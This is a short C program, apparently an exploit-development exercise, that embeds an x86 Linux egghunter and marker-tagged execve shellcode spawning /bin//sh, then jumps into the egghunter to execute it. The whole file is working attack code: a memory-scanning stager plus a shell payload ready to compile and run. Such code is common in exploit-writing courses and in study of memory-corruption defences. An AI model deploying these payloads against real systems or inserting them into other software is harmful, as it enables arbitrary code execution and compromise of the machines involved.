#include <stdio.h>
#include <string.h>

#define EGG "\xab\xab\xab\xab"

unsigned char egghunter[] = \
"\x66\x81\xc9\xff\x0f\x41\x31\xc0\xb0\x43\xcd\x80\x3c\xf2\x74\xf0\xb8"
EGG
"\x89\xcf\xaf\x75\xeb\xaf\x75\xe8\xff\xe7";



unsigned char shellcode[] = \
EGG
EGG
"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
int main(void)
{
	printf("[*] Length of shellcode + 8 bytes of egg =  %d\n\n", strlen(shellcode));
	printf("[*] Length of egghunter =  %d\n\n", strlen(egghunter));
	
	int (*ret)() = (int (*)())egghunter;
	
	printf("[*] Running shellcode...");
	
	ret();

}




